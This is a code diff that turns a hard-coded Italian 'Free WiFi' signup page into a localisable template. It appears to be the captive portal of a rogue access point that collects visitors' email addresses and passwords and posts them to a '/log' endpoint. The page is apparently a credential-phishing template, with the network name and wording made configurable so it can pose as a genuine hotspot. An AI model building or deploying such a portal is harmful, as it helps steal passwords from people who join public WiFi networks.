@@ -1,7 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="{lang}">
   <head>
-    <title>Accedi</title>
+    <title>{signup}</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
       body {
@@ -47,15 +47,15 @@
   </head>
   <body>
     <div class="register">
-      <h1>Free WiFi</h1>
-      <h3>Veloce, sicuro, gratuito</h3>
-      <p>Per continuare a navigare senza limiti, registrati con un indirizzo e-mail valido</p>
+      <h1>{essid}</h1>
+      <h3>{description}</h3>
+      <p>{info}</p>
       <form action="/log" method="POST">
         <input type="text" id="s" name="s" value="s" hidden>
-        <input type="email" id="email" name="email" placeholder="Indirizzo e-mail" required>
-        <input type="password" id="pass1" name="pass1" placeholder="Password" minlength="6" required>
-        <input type="password" id="pass2" name="pass2" placeholder="Ripeti password" minlength="6" required>
-        <input type="submit" value="Registrati">
+        <input type="email" id="email" name="email" placeholder="{email}" required>
+        <input type="password" id="pass1" name="pass1" placeholder="{pass1}" minlength="6" required>
+        <input type="password" id="pass2" name="pass2" placeholder="{pass2}" minlength="6" required>
+        <input type="submit" value="{register}">
       </form>
     </div>
   </body>
